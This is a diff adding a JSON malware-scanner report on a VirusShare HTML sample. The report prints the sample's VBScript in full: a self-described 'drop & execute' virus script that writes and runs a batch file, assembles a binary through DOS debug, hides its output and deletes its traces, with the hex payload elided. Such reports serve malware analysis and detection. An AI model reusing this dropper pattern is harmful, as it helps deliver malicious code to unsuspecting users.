@@ -1,0 +1,56 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "Wscript.Shell": "May run an executable file or a system command"
+        },
+        "macro": "' Virus Script by ULTRAS [MATRiX] : drop & execute file.\n<script Language=\"VBScript\"><!--\nDim a,f,s\nSet a = CreateObject(\"Wscript.Shell\")\nSet f = CreateObject(\"Scripting.FileSystemObject\")\nSet s = f.CreateTextFile(\"ultras.bat\", 2, False)\ns.WriteLine \"@echo off\"\ns.WriteLine \"ctty nul\"\ns.WriteLine \"ECHO E0100 BA 4B 02 BA 58 02 E8 54 00 BA ...etc>>virus.scr\"\ns.WriteLine \"ECHO u debug script ............................ >>virus.scr\"\ns.WriteLine \"ECHO g >>fire.scr\"\ns.WriteLine \"ECHO q >>fire.scr\"\ns.WriteLine \"debug<fire.scr\"\ns.WriteLine \"del fire.scr\"\ns.WriteLine \"ctty con\"\ns.Close\na.Run (\"ultras.bat\")\n--></script>"
+    },
+    "filename": "VirusShare_0f1aa42693614e3b3f69560980bed34a",
+    "filesize": 636,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "0f1aa42693614e3b3f69560980bed34a",
+        "sha1": "41f2253bea308ce94756ef87cfe6d925e76dc385",
+        "sha256": "273fe84d68d7af3cef641ddb0a3340057b560dfd34ad6627dd5bb05a740de164"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "' Virus Script by ULTRAS [MATRiX] : drop & execute file.",
+            "<script Language=\"VBScript\"><!--",
+            "Dim a,f,s",
+            "Set a = CreateObject(\"Wscript.Shell\")",
+            "Set f = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set s = f.CreateTextFile(\"ultras.bat\", 2, False)",
+            "s.WriteLine \"@echo off\"",
+            "s.WriteLine \"ctty nul\"",
+            "s.WriteLine \"ECHO E0100 BA 4B 02 BA 58 02 E8 54 00 BA ...etc>>virus.scr\"",
+            "s.WriteLine \"ECHO u debug script ............................ >>virus.scr\"",
+            "s.WriteLine \"ECHO g >>fire.scr\"",
+            "s.WriteLine \"ECHO q >>fire.scr\"",
+            "s.WriteLine \"debug<fire.scr\"",
+            "s.WriteLine \"del fire.scr\"",
+            "s.WriteLine \"ctty con\"",
+            "s.Close",
+            "a.Run (\"ultras.bat\")",
+            "--></script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.290448",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
